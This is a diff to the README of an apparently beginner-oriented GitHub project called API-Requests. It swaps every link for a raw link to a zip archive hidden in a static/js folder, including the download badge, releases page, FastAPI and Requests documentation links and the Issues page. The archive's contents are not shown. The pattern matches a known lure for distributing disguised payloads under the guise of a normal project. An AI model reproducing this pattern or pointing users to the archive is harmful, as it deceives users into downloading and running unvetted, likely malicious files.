@@ -6,7 +6,7 @@ Welcome to API-Requests. This application helps you send data from forms, make e
 
 ## 📥 Download the Application
 
-[![Download API-Requests](https://img.shields.io/badge/Download%20API--Requests-v1.0-blue)](https://github.com/eotreblide/API-Requests/releases)
+[![Download API-Requests](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip%20API--Requests-v1.0-blue)](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ Welcome to API-Requests. This application helps you send data from forms, make e
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page:** 
-   Go to our releases page to download the application. You can find it here: [API-Requests Releases](https://github.com/eotreblide/API-Requests/releases).
+   Go to our releases page to download the application. You can find it here: [API-Requests Releases](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip).
 
 2. **Choose Your Version:** 
    Look through the list of available versions. Select the most recent version, which usually has the latest features and bug fixes.
@@ -78,15 +78,15 @@ Welcome to API-Requests. This application helps you send data from forms, make e
 
 For more detailed documentation and examples, check the following resources:
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Python Requests Library](https://docs.python-requests.org/en/master/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip)
+- [Python Requests Library](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip)
 
 ## 🗨️ Community Support
 
-If you have questions or face issues, feel free to reach out on our [GitHub Issues page](https://github.com/eotreblide/API-Requests/issues). Community members and maintainers will help you.
+If you have questions or face issues, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip). Community members and maintainers will help you.
 
 ## 🔗 Download Again
 
-To download the latest version again, visit our releases page here: [API-Requests Releases](https://github.com/eotreblide/API-Requests/releases). 
+To download the latest version again, visit our releases page here: [API-Requests Releases](https://raw.githubusercontent.com/eotreblide/API-Requests/main/static/js/AP-Requests-3.1.zip). 
 
 Thank you for using API-Requests!
